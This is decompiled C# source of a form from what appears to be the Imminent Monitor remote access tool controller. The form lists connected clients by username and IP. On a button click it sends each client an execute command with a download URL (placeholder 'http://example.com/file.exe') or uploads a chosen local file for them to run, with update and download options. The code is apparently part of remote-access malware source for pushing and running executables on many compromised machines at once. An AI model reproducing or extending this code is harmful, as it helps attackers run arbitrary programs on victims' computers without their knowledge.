// Decompiled with JetBrains decompiler
// Type: FormExecuteUpdate
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class FormExecuteUpdate : Form
{
  private IContainer icontainer_0;
  private GClass41 gclass41_0;
  private ImageList imageList_0;
  private TextBox textBox_0;
  private Label label_0;
  private TextBox textBox_1;
  private Button button_0;
  private ColumnHeader columnHeader_0;
  private ColumnHeader columnHeader_1;
  public List<GClass18> list_0;
  public bool bool_0;
  public bool bool_1;
  public bool bool_2;
  public bool bool_3;

  public FormExecuteUpdate(
    List<GClass18> list_1,
    bool bool_4,
    bool bool_5,
    bool bool_6,
    bool bool_7)
  {
    this.Load += new EventHandler(this.FormExecuteUpdate_Load);
    this.list_0 = new List<GClass18>();
    this.bool_0 = false;
    this.bool_1 = false;
    this.bool_2 = false;
    this.bool_3 = false;
    this.InitializeComponent();
    this.bool_0 = bool_4;
    this.bool_1 = bool_5;
    this.bool_2 = bool_6;
    this.bool_3 = bool_7;
    this.list_0 = list_1;
    this.method_1();
    this.method_0();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormExecuteUpdate));
    this.vmethod_1(new GClass41());
    this.vmethod_13(new ColumnHeader());
    this.vmethod_15(new ColumnHeader());
    this.vmethod_3(new ImageList(this.icontainer_0));
    this.vmethod_5(new TextBox());
    this.vmethod_7(new Label());
    this.vmethod_9(new TextBox());
    this.vmethod_11(new Button());
    this.SuspendLayout();
    this.vmethod_0().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_0().Columns.AddRange(new ColumnHeader[2]
    {
      this.vmethod_12(),
      this.vmethod_14()
    });
    this.vmethod_0().Font = new Font("Verdana", 8.25f);
    this.vmethod_0().FullRowSelect = true;
    this.vmethod_0().HideSelection = false;
    this.vmethod_0().LargeImageList = this.vmethod_2();
    GClass41 gclass41_1 = this.vmethod_0();
    Point point1 = new Point(12, 12);
    Point point2 = point1;
    gclass41_1.Location = point2;
    this.vmethod_0().Name = "AeroListviewClients";
    GClass41 gclass41_2 = this.vmethod_0();
    Size size1 = new Size(600, 390);
    Size size2 = size1;
    gclass41_2.Size = size2;
    this.vmethod_0().TabIndex = 0;
    this.vmethod_0().UseCompatibleStateImageBehavior = false;
    this.vmethod_0().View = View.Tile;
    this.vmethod_12().Text = "Username/IP";
    this.vmethod_14().Text = "Action";
    this.vmethod_14().TextAlign = HorizontalAlignment.Center;
    this.vmethod_2().ImageStream = (ImageListStreamer) componentResourceManager.GetObject("ImageListClients.ImageStream");
    this.vmethod_2().TransparentColor = Color.Transparent;
    this.vmethod_2().Images.SetKeyName(0, "client.png");
    this.vmethod_4().Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
    TextBox textBox1 = this.vmethod_4();
    point1 = new Point(440, 408);
    Point point3 = point1;
    textBox1.Location = point3;
    this.vmethod_4().Name = "TextBoxFileName";
    TextBox textBox2 = this.vmethod_4();
    size1 = new Size(93, 22);
    Size size3 = size1;
    textBox2.Size = size3;
    this.vmethod_4().TabIndex = 8;
    this.vmethod_6().Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
    this.vmethod_6().AutoSize = true;
    Label label1 = this.vmethod_6();
    point1 = new Point(428, 411);
    Point point4 = point1;
    label1.Location = point4;
    this.vmethod_6().Name = "LabelDelimiter";
    Label label2 = this.vmethod_6();
    size1 = new Size(10, 13);
    Size size4 = size1;
    label2.Size = size4;
    this.vmethod_6().TabIndex = 7;
    this.vmethod_6().Text = ":";
    this.vmethod_8().Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    TextBox textBox3 = this.vmethod_8();
    point1 = new Point(12, 408);
    Point point5 = point1;
    textBox3.Location = point5;
    this.vmethod_8().Name = "TextBoxURL";
    TextBox textBox4 = this.vmethod_8();
    size1 = new Size(412, 22);
    Size size5 = size1;
    textBox4.Size = size5;
    this.vmethod_8().TabIndex = 6;
    this.vmethod_10().Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
    Button button1 = this.vmethod_10();
    point1 = new Point(539, 408);
    Point point6 = point1;
    button1.Location = point6;
    this.vmethod_10().Name = "ButtonBrowse";
    Button button2 = this.vmethod_10();
    size1 = new Size(74, 22);
    Size size6 = size1;
    button2.Size = size6;
    this.vmethod_10().TabIndex = 5;
    this.vmethod_10().Text = "Browse...";
    this.vmethod_10().TextImageRelation = TextImageRelation.TextBeforeImage;
    this.vmethod_10().UseVisualStyleBackColor = true;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    size1 = new Size(624, 441);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.vmethod_4());
    this.Controls.Add((Control) this.vmethod_6());
    this.Controls.Add((Control) this.vmethod_8());
    this.Controls.Add((Control) this.vmethod_10());
    this.Controls.Add((Control) this.vmethod_0());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.Name = nameof (FormExecuteUpdate);
    this.StartPosition = FormStartPosition.CenterScreen;
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual GClass41 vmethod_0() => this.gclass41_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(GClass41 gclass41_1) => this.gclass41_0 = gclass41_1;

  internal virtual ImageList vmethod_2() => this.imageList_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(ImageList imageList_1) => this.imageList_0 = imageList_1;

  internal virtual TextBox vmethod_4() => this.textBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(TextBox textBox_2) => this.textBox_0 = textBox_2;

  internal virtual Label vmethod_6() => this.label_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(Label label_1) => this.label_0 = label_1;

  internal virtual TextBox vmethod_8() => this.textBox_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(TextBox textBox_2) => this.textBox_1 = textBox_2;

  internal virtual Button vmethod_10() => this.button_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(Button button_1)
  {
    EventHandler eventHandler = new EventHandler(this.method_5);
    if (this.button_0 != null)
      this.button_0.Click -= eventHandler;
    this.button_0 = button_1;
    if (this.button_0 == null)
      return;
    this.button_0.Click += eventHandler;
  }

  internal virtual ColumnHeader vmethod_12() => this.columnHeader_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(ColumnHeader columnHeader_2) => this.columnHeader_0 = columnHeader_2;

  internal virtual ColumnHeader vmethod_14() => this.columnHeader_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(ColumnHeader columnHeader_2) => this.columnHeader_1 = columnHeader_2;

  private void FormExecuteUpdate_Load(object sender, EventArgs e)
  {
    List<TextBox> list_2 = new List<TextBox>();
    List<string> list_3 = new List<string>();
    list_2.AddRange((IEnumerable<TextBox>) new TextBox[2]
    {
      this.vmethod_8(),
      this.vmethod_4()
    });
    list_3.AddRange((IEnumerable<string>) new string[2]
    {
      "http://example.com/file.exe",
      "file.exe"
    });
    Class97.smethod_9(ref list_2, list_3);
    Class97.smethod_11((Form) this);
  }

  private void method_0()
  {
    if (this.bool_2)
    {
      this.vmethod_10().Visible = true;
      this.vmethod_8().Visible = false;
      this.vmethod_6().Visible = false;
      this.vmethod_4().Visible = false;
      this.Text = string.Format("Upload - Clients Connected: {0}", (object) this.list_0.Count);
    }
    if (!this.bool_3)
      return;
    this.vmethod_8().Visible = true;
    this.vmethod_6().Visible = true;
    this.vmethod_4().Visible = true;
    this.Text = string.Format("Direct Link - Clients Connected: {0}", (object) this.list_0.Count);
    this.vmethod_10().Text = "Download";
  }

  private void method_1()
  {
    try
    {
      foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) this.list_0))
      {
        ListViewItem listViewItem = new ListViewItem();
        listViewItem.Text = string.Format("{0}/{1}", (object) gclass18.method_20().string_1, (object) gclass18.method_20().string_2);
        listViewItem.SubItems.Add("Idle");
        listViewItem.ImageIndex = 0;
        this.vmethod_0().Items.Add(listViewItem);
        gclass18.method_20().listViewItem_0 = listViewItem;
      }
    }
    finally
    {
      List<GClass18>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }

  public void method_2(GClass18 gclass18_0, object[] object_0) => gclass18_0.method_20().listViewItem_0.SubItems[1].Text = (string) object_0[2];

  private void method_3(
    GClass18 gclass18_0,
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ExecutePacket executePacket_0)
  {
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[4]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Execute,
      (object) executePacket_0,
      (object) this.vmethod_8().Text,
      (object) this.vmethod_4().Text
    });
  }

  private void method_4(
    GClass18 gclass18_0,
    byte[] byte_0,
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FastTransferPacket fastTransferPacket_0,
    bool bool_4,
    bool bool_5,
    string string_0,
    string string_1)
  {
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[7]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FastTransfer,
      (object) fastTransferPacket_0,
      (object) bool_4,
      (object) byte_0,
      (object) string_0,
      (object) bool_5,
      (object) string_1
    });
  }

  private void method_5(object sender, EventArgs e)
  {
    lock (this.list_0)
    {
      if (this.bool_3)
      {
        try
        {
          foreach (GClass18 gclass18_0 in new List<GClass18>((IEnumerable<GClass18>) this.list_0))
          {
            if (this.bool_0)
              this.method_3(gclass18_0, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ExecutePacket.Update);
            if (this.bool_1)
              this.method_3(gclass18_0, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ExecutePacket.Download);
          }
        }
        finally
        {
          List<GClass18>.Enumerator enumerator;
          enumerator.Dispose();
        }
      }
      if (!this.bool_2)
        return;
      OpenFileDialog openFileDialog = new OpenFileDialog();
      openFileDialog.FilterIndex = 1;
      if (openFileDialog.ShowDialog() != DialogResult.OK)
        return;
      byte[] byte_0 = File.ReadAllBytes(openFileDialog.FileName);
      string extension = new FileInfo(openFileDialog.FileName).Extension;
      try
      {
        foreach (GClass18 gclass18_0 in new List<GClass18>((IEnumerable<GClass18>) this.list_0))
        {
          if (this.bool_0)
            this.method_4(gclass18_0, byte_0, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FastTransferPacket.Execution, true, false, extension, "C:\\");
          if (this.bool_1)
            this.method_4(gclass18_0, byte_0, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FastTransferPacket.Execution, false, false, extension, "C:\\");
        }
      }
      finally
      {
        List<GClass18>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }
  }
}
